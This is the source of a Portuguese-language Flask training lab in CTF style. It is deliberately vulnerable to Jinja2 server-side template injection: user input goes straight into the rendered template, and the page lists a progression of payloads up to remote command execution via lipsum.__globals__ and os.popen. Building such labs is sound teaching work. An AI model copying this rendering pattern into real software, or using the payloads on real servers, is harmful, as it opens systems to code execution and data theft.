"""
SD CyberLab — SSTI (Server-Side Template Injection) com Jinja2
"""
import os
from flask import Flask, request, Response
from jinja2 import Environment

app = Flask(__name__)
JINJA_ENV = Environment()

with open("/tmp/flag.txt", "w") as f:
    f.write("SDC_Flag{SST1_J1nj42_RC3_4ch13v3d}\n")

BRAND = """
  <div class="brand"><span>🛡️</span> SD CyberLab</div>
  <h1>🔥 Lab SSTI — Portal de Boas-vindas</h1>
"""

STYLE = """<style>
    *{box-sizing:border-box}
    body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:2rem;margin:0}
    .brand{display:flex;align-items:center;gap:.5rem;font-size:1.4rem;font-weight:bold;color:#f78166;margin-bottom:.4rem;letter-spacing:.03em}
    .brand span{font-size:1.6rem}
    h1{color:#f78166;margin-top:0;font-size:1.3rem}
    h2{color:#8b949e;font-size:.95rem;margin-bottom:.5rem;text-transform:uppercase;letter-spacing:.06em}
    code{background:#161b22;padding:2px 7px;border-radius:4px;font-size:.9rem}
    .box{background:#161b22;border:1px solid #30363d;padding:1rem 1.2rem;margin:1rem 0;border-radius:6px}
    input{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:4px;width:460px}
    button{background:#f78166;border:none;color:#0d1117;padding:6px 14px;border-radius:4px;cursor:pointer;font-weight:bold}
    .output{color:#79c0ff;font-size:1.05rem;margin-top:1rem;word-break:break-all;white-space:pre-wrap}
    li{margin:5px 0}
    .dica{border-left:3px solid #e3b341;padding:.5rem 1rem;background:#1a1600;border-radius:0 4px 4px 0;color:#e3b341;margin-top:.5rem}
    .formato{color:#8b949e;font-size:.85rem;margin-top:.4rem}
</style>"""

PAGE_TOP = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>🛡️ SD CyberLab: 🔥 Lab SSTI — Portal de Boas-vindas</title>
  """ + STYLE + """
</head>
<body>
""" + BRAND + """
  <div class="box">
    <h2>Situação</h2>
    <p>O parâmetro <code>name</code> é inserido diretamente no template Jinja2 sem sanitização.</p>
    <p>Teste inicial: <code>?name={{7*7}}</code> → deve exibir <strong>49</strong></p>
  </div>
  <div class="box">
    <h2>Progressão de payloads</h2>
    <ul>
      <li><code>{{7*7}}</code> — confirmação de SSTI</li>
      <li><code>{{config.items()}}</code> — vazar configuração da app</li>
      <li><code>{{request.environ}}</code> — variáveis de ambiente</li>
      <li><code>{{lipsum.__globals__['os'].popen('id').read()}}</code> — RCE</li>
    </ul>
    <div class="dica">
      💡 <strong>Dica:</strong> conseguiu executar comandos no servidor? Explore o sistema de arquivos.
      Arquivos temporários costumam guardar segredos em sistemas mal configurados.
      <div class="formato">Formato da flag: <code>SDC_Flag{...}</code></div>
    </div>
  </div>
"""
PAGE_BOTTOM = "</body></html>"

@app.route("/")
def index():
    name = request.args.get("name", "visitante")
    try:
        tmpl = JINJA_ENV.from_string("Olá, " + name + "!")
        output = tmpl.render(
            config=app.config,
            request=request,
            lipsum=__import__('jinja2').utils.generate_lorem_ipsum
        )
    except Exception as e:
        output = f"[Erro de template]: {e}"

    safe_name = name.replace("&", "&amp;").replace("<", "&lt;").replace('"', "&quot;")
    html = (
        PAGE_TOP
        + '<div class="box">'
        + '<form method="GET"><label>Nome:</label><br><br>'
        + '<input name="name" value="' + safe_name + '" placeholder="visitante"> '
        + '<button type="submit">Enviar</button></form>'
        + '<div class="output">' + output + '</div>'
        + '</div>'
        + PAGE_BOTTOM
    )
    return Response(html, mimetype="text/html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
